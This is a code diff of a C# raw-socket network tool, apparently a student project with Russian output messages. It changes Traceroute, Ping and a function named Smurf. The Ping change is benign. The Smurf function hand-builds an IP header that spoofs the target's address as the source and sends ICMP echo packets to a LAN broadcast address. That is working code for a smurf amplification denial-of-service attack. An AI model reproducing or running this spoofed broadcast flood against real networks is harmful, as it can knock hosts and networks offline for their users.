@@ -129,9 +129,6 @@ void Traceroute(string hostName, Socket socket, ConcurrentDictionary<string, Lis
                 mutex.ReleaseMutex();
             }
 
-            
-
-
             TimeSpan timestop = DateTime.Now - timestart;
 
             if (response.Type == 11)
@@ -178,8 +175,7 @@ void Ping(string hostName, Socket socket)
     try
     {
         iphe = Dns.GetHostEntry(hostName);
-        iep = new IPEndPoint(iphe.AddressList[0], 0);
-        
+        iep = new IPEndPoint(iphe.AddressList[0], 0);   
     }
     catch
     {
@@ -204,60 +200,60 @@ void Ping(string hostName, Socket socket)
     UInt16 chcksum = packet.getChecksum();
     packet.Checksum = chcksum;
     socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 3000);
-    
-    mutex.WaitOne();
-
-    DateTime timestart = DateTime.Now;
-
-    socket.SendTo(packet.getBytes(), packetsize, SocketFlags.None, iep);
-    mutex.ReleaseMutex();
-
-    try
+    int counter = 0;
+    for (int i = 0; i < 5; i++)
     {
-        ICMP response;
-        data = new byte[1024];
+        mutex.WaitOne();
 
-        while (true)
+        DateTime timestart = DateTime.Now;
+
+        socket.SendTo(packet.getBytes(), packetsize, SocketFlags.None, iep);
+        mutex.ReleaseMutex();
+
+        try
         {
-            byte[] tid = BitConverter.GetBytes((short)Thread.CurrentThread.ManagedThreadId);
-            byte[] id;
-            mutex.WaitOne();
-            recv = socket.Receive(data, SocketFlags.Peek);
+            ICMP response;
+            data = new byte[1024];
 
-            response = new ICMP(data, recv);
+            while (true)
+            {
+                byte[] tid = BitConverter.GetBytes((short)Thread.CurrentThread.ManagedThreadId);
+                byte[] id;
+                mutex.WaitOne();
+                recv = socket.Receive(data, SocketFlags.Peek);
+
+                response = new ICMP(data, recv);
+                if (response.Type == 0)
+                {
+                    id = data[24..26];
+                }
+                else
+                {
+                    id = data[52..54];
+                }
+
+                if (tid[0] == id[0] && tid[1] == id[1])
+                {
+                    recv = socket.ReceiveFrom(data, ref ep);
+                    mutex.ReleaseMutex();
+                    break;
+                }
+                mutex.ReleaseMutex();
+            }
+
+            TimeSpan timestop = DateTime.Now - timestart;
+
             if (response.Type == 0)
             {
-                id = data[24..26];
+                counter++;
             }
-            else
-            {
-                id = data[52..54];
-            }
-
-            if (tid[0] == id[0] && tid[1] == id[1])
-            {
-                recv = socket.ReceiveFrom(data, ref ep);
-                mutex.ReleaseMutex();
-                break;
-            }
-            mutex.ReleaseMutex();
         }
-
-        TimeSpan timestop = DateTime.Now - timestart;
-
-        if (response.Type == 0)
+        catch (SocketException)
         {
-            Console.WriteLine($"Ответ от {hostName} получен.");
         }
-        else
-        {
-            //problem text
-        }
-     }
-    catch (SocketException)
-    {
-        Console.WriteLine($"не удалось получить ответ от {hostName}");
     }
+
+    Console.WriteLine($"Успешно передано {counter} из 5 пакетов {hostName}");
     
 }
 
@@ -268,17 +264,6 @@ void Smurf(string hostName, Socket socket)
     IPHostEntry iphe;
     IPEndPoint iep = new IPEndPoint(0, 0);
     EndPoint ep;
-
-    //try
-    //{
-    //    iphe = Dns.GetHostEntry(hostName);
-    //    iep = new IPEndPoint(iphe.AddressList[0], 0);
-
-    //}
-    //catch
-    //{
-    //    iep = new IPEndPoint(new IPAddress(hostName.Split('.').Select(n => byte.Parse(n)).ToArray()), 6666);
-    //}
 
     iep = new IPEndPoint(new IPAddress(hostName.Split('.').Select(n => byte.Parse(n)).ToArray()), 6666);
 
@@ -308,9 +293,6 @@ void Smurf(string hostName, Socket socket)
 
     byte[] ipHeader = new byte[20];
 
-
-
-
     ipHeader[0] = 0x45;
     ipHeader[3] = 0x26;
     ipHeader[4] = 0x28;
@@ -319,10 +301,9 @@ void Smurf(string hostName, Socket socket)
     ipHeader[9] = 0x01;
 
 
-    //Buffer.BlockCopy(new byte[] {192, 168, 0, 11}, 0, ipHeader, 12, 4);
     Buffer.BlockCopy(iep.Address.GetAddressBytes(), 0, ipHeader, 12, 4);
 
-    Buffer.BlockCopy(new byte[] { 192, 168, 0, 255 }, 0, ipHeader, 16, 4);
+    Buffer.BlockCopy(new byte[] { 192, 168, 43, 255 }, 0, ipHeader, 16, 4);
 
     var check = IpChecksum(ipHeader);
 
@@ -333,68 +314,12 @@ void Smurf(string hostName, Socket socket)
 
     byte[] pkt = packet.getBytes();
 
-    byte[] smurfPacket = new byte[ipHeader.Length + pkt.Length];
-
-
-    //Buffer.BlockCopy(ethernetHeader, 0, smurfPacket, 0, ethernetHeader.Length);
-    //Buffer.BlockCopy(ipHeader, 0, smurfPacket, ethernetHeader.Length, ipHeader.Length);
-    //Buffer.BlockCopy(pkt, 0, smurfPacket, ipHeader.Length, pkt.Length);
-
     byte[] smurfPacket2 = new byte[ipHeader.Length + pkt.Length];
     Buffer.BlockCopy(ipHeader, 0, smurfPacket2, 0, ipHeader.Length);
     Buffer.BlockCopy(pkt, 0, smurfPacket2, ipHeader.Length, pkt.Length);
 
-    Buffer.BlockCopy(pkt, 0, smurfPacket, 0, pkt.Length);
-
     socket.SendTo(smurfPacket2, smurfPacket2.Length, SocketFlags.None, iep);
     mutex.ReleaseMutex();
-
-    try
-    {
-        ICMP response;
-        data = new byte[1024];
-
-        while (true)
-        {
-            byte[] tid = BitConverter.GetBytes((short)Thread.CurrentThread.ManagedThreadId);
-            byte[] id;
-            mutex.WaitOne();
-            recv = socket.Receive(data, SocketFlags.Peek);
-
-            response = new ICMP(data, recv);
-            if (response.Type == 0)
-            {
-                id = data[24..26];
-            }
-            else
-            {
-                id = data[52..54];
-            }
-
-            if (tid[0] == id[0] && tid[1] == id[1])
-            {
-                recv = socket.ReceiveFrom(data, ref ep);
-                mutex.ReleaseMutex();
-                break;
-            }
-            mutex.ReleaseMutex();
-        }
-
-        TimeSpan timestop = DateTime.Now - timestart;
-
-        if (response.Type == 0)
-        {
-            Console.WriteLine($"Ответ от {hostName} получен.");
-        }
-        else
-        {
-            //problem text
-        }
-    }
-    catch (SocketException)
-    {
-        Console.WriteLine($"не удалось получить ответ от {hostName}");
-    }
 
     byte[] IpChecksum(byte[] ipHeader)
     {
